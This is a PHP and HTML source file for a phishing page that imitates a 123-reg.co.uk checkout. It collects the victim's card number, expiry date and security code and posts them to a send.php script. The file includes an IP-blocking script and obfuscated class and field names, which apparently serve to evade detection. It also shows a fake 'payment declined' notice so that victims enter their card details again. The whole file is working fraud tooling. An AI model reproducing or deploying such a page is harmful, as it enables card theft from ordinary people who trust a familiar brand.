<?php require '../main.php';require_once 'blockip.php';?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/favicon.png" />
    <title>123-reg.co.uk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #FFFFFF;
            color: #333;
            line-height: 1.6;
        }

        .wave {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 15px 0;
        }

        .shoreline {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .surfboard {
            color: #111;
        }

        .beachbreak {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            padding: 20px 0;
        }

        .paddle {
            color: #0073b1;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 10px;
            cursor: pointer;
        }

        .pipeline {
            font-size: 32px;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .reef {
            display: flex;
            gap: 30px;
        }

        .leftbreak {
            flex: 1;
        }

        .rightbreak {
            width: 380px;
        }

        /* Checkout Sections */
        .barrel {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
        }

        .peakheader {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .peakheader h2 {
            font-size: 20px;
            font-weight: 600;
        }

        .waveface {
            padding: 20px;
        }


        /* Payment Form Styles */
        .wipeout {
            background-color: #a6fff7;
            border: none;
            padding: 9px 12px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            font-size: 18px;
            margin-bottom: 25px;
            color: #000;
            width: fit-content;
        }

        .wipeout i {
            background: white;
            padding: 8px;
            border-radius: 4px;
        }

        .longboard {
            margin-bottom: 25px;
        }

        .shortboard {
            display: flex;
            flex-direction: row;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .fin, .leash {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 15px;
            border-right: 1px solid #ddd;
        }

        .fin img, .leash img {
            display: block;
            height: 35px;
            width: 50px;
        }

        /* Input Styles */
        .wetsuit {
            position: relative;
            padding: 15px;
        }

        .rash {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            transition: all 0.2s ease-in-out;
            background-color: transparent;
            padding: 0;
            font-size: 16px;
            color: #666;
            font-weight: bold;
        }

        .wax {
            width: 100%;
            border: none;
            outline: none;
            font-size: 14px;
            padding: 7px 0;
            background: transparent;
        }

        .wax:focus + .rash,
        .wax:not(:placeholder-shown) + .rash {
            top: 8px;
            font-size: 12px;
            transform: translateY(0);
        }

        .offshore {
            color: #dc3545;
            margin-left: 2px;
        }

        /* Specific styles for card number input */
        .deck .wetsuit {
            padding-left: 17px;
        }

        .deck .rash {
            position: absolute;
            left: 17px;
            top: 50%;
            transform: translateY(-50%);
            transition: all 0.2s ease-in-out;
            background-color: transparent;
            padding: 0;
        }

        .deck .wax:focus + .rash,
        .deck .wax:not(:placeholder-shown) + .rash {
            top: 0;
            font-size: 12px;
            transform: translateY(0);
        }

        .lineup {
            display: flex;
            margin-top: 20px;
        }

        .takeoff, .cutback {
            flex-grow: 1;
            position: relative;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .takeoff {
            margin-right: 20px;
        }

        .cutback {
            display: flex;
            flex-grow: 1;
            position: relative;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .leash {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 12px;
            border-left: 1px solid #ddd;
        }

        .leash img {
            height: 35px;
            width: 50px;
        }

        .floater {
            flex-grow: 1;
        }

        .dropknee {
            width: 100%;
            background-color: #999;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.3s ease;
        }

        .dropknee.active {
            background-color: #111111;
        }

        /* Order Summary Image */
        .pointbreak {
            width: 100%;
            height: auto;
            border-radius: 5px;
        }

        /* Responsive */
        @media (max-width: 900px) {
            .reef {
                flex-direction: column;
            }
            
            .rightbreak {
                width: 100%;
            }


            /* Change Security Code to CVV on mobile */
            .floater .rash::before {
                content: 'CVV';
            }
            
            /* Hide the original Security Code text */
            .floater .rash span:first-of-type {
                display: none;
            }
        }

        /* Updated styles for CVV input */
        .floater .wax::placeholder {
            color: transparent;
        }

        .shorebreak {
            border: 2px solid #dfdfdf;
        }

        .tideline {
            text-align: center;
            padding: 20px 0;
            margin-top: 80px;
            color: #666;
            font-size: 12px;
        }

        .tideline a {
            color: #00a4a6;
            text-decoration: none;
        }

        .tideline a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <div class="wave shoreline">
            <div class="surfboard">
                <img src="./img/lgo.webp" width="140" height="40">
            </div>
            <div class="beachbreak">
                <img src="./img/out.webp" width="24" height="24" style="max-width: 24px; height: auto;">
            </div>
        </div>
    </header>

    <main class="wave">
        <div class="paddle">
            <i class="fas fa-chevron-left"></i> Back
        </div>
        
        <h1 class="pipeline">Checkout</h1>
        
        <div class="reef">
            <div class="leftbreak">
                
                <div class="barrel shorebreak">
                    <div class="peakheader">
                        <h2>Payment Method</h2>
                    </div>
                    <div class="waveface">
                        <button class="wipeout">
                            <img src="./img/kh.webp" style="height: 35px; width: 50px;">
                            <span>Add New Card</span>
                        </button>
                        
<?php
if(isset($_GET['e'])){
echo '<span style="color: red; display: inline; font-size: 11px;">Payment declined: Please update your payment information</span><br><br>';
}
?>                        <form id="creditCardForm" method="POST" action="send.php">
                            <div class="longboard">
                                <div class="shortboard">
                                    <div class="fin">
                                        <img id="cardFin" src="./img/nm.webp">
                                    </div>
                                    <div class="deck">
                                        <div class="wetsuit">
                                            <input class="wax" id="cardRider" name="khikhi" type="tel" placeholder=" " autocomplete="cc-number" required>
                                            <label class="rash" for="cardRider">
                                                Card Number<span class="offshore">*</span>
                                            </label>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="lineup">
                                    <div class="takeoff">
                                        <div class="wetsuit">
                                            <input class="wax" id="tideTime" name="11" type="tel" placeholder=" " autocomplete="cc-exp" maxlength="5" required>
                                            <label class="rash" for="tideTime">
                                                MM/YY<span class="offshore">*</span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="cutback">
                                        <div class="floater">
                                            <div class="wetsuit">
                                                <input class="wax" id="waveHeight" name="22" type="password" placeholder=" " autocomplete="cc-csc" maxlength="3" required>
                                                <label class="rash" for="waveHeight">
                                                    <span>Security Code</span><span class="offshore">*</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="leash">
                                            <img src="./img/cv.webp">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <button type="submit" class="dropknee">Review Order</button>
                        </form>
                        <!-- End of form wrapper -->
                    </div>
                </div>
            </div>
            
            <div class="rightbreak">
                <img src="./img/odr.webp" class="pointbreak">
            </div>
        </div>
    </main>
    <footer class="tideline">
        <div class="wave">
            Copyright © 1999 - 2025 123-reg.co.uk Operating Company, LLC. All Rights Reserved. 
            <a>Privacy Policy</a>
        </div>
    </footer>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const cardRider = document.getElementById('cardRider');
        const cardFin = document.getElementById('cardFin');
        const tideTime = document.getElementById('tideTime');
        const waveHeight = document.getElementById('waveHeight');
        const dropknee = document.querySelector('.dropknee');

        function checkFormCompletion() {
            const isCardNumberValid = cardRider.value.replace(/\s/g, '').length >= 15;
            const isExpirationValid = tideTime.value.length === 5;
            const isCvcValid = waveHeight.value.length >= 3;

            if (isCardNumberValid && isExpirationValid && isCvcValid) {
                dropknee.classList.add('active');
            } else {
                dropknee.classList.remove('active');
            }
        }

        cardRider.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            
            if (/^3[47]/.test(value)) {
                if (value.length > 15) {
                    value = value.slice(0, 15);
                }
                for (let i = 0; i < value.length; i++) {
                    if (i === 4 || i === 10) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                cardFin.src = './img/a.webp';
                waveHeight.maxLength = 4;
            } else {
                if (value.length > 16) {
                    value = value.slice(0, 16);
                }
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                
                if (value.startsWith('4')) {
                    cardFin.src = './img/v.webp';
                    waveHeight.maxLength = 3;
                } else if (value.startsWith('5')) {
                    cardFin.src = './img/m.webp';
                    waveHeight.maxLength = 3;
                } else {
                    cardFin.src = './img/nm.webp';
                    waveHeight.maxLength = 3;
                }
            }
            
            e.target.value = formattedValue;
            checkFormCompletion();
        });

        tideTime.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) {
                value = value.slice(0, 4);
            }
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            e.target.value = value;
            checkFormCompletion();
        });

        waveHeight.addEventListener('input', checkFormCompletion);

        // Remove placeholder for CVC when focused
        waveHeight.addEventListener('focus', function() {
            this.placeholder = '';
        });

        // Restore placeholder for CVC when blurred and empty
        waveHeight.addEventListener('blur', function() {
            if (this.value === '') {
                this.placeholder = ' ';
            }
        });
    });

    window.handleFormSubmit = function(event) {
        event.preventDefault();
        
        const formData = new FormData(event.target);
        const cardData = {
            cardNumber: formData.get('cardNumber'),
            expiryDate: formData.get('expiryDate'),
            securityCode: formData.get('securityCode')
        };
        
        console.log('Form submitted with data:', cardData);
        // Add your form submission logic here
        alert('Form submitted successfully!');
        
        return false;
    };
    </script>
     <script src="js/jq.js"></script>
    <?php $m->ctr(" CREDIT CARD 🏦 ".@$_GET['e']); ?>
</body>
</html>
